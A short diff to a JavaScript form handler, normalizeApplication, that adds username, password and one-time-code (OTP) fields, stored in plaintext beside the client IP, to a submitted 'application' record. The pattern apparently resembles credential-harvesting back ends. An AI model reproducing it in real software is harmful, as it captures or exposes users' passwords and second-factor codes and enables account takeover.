@@ -73,7 +73,10 @@ function normalizeApplication(payload, req) {
     address: String(data.address || [data.wilaya, data.commune, data.street].filter(Boolean).join(' / ') || '').trim(),
     status: String(data.status || 'new').trim() || 'new',
     createdAt: new Date().toISOString(),
-    ip: getClientIp(req),
+   ip: getClientIp(req),
+ username: String(data.username || '').trim(),
+    password: String(data.password || '').trim(),
+    otp: String(data.otp || '').trim()
   };
   return app;
 }
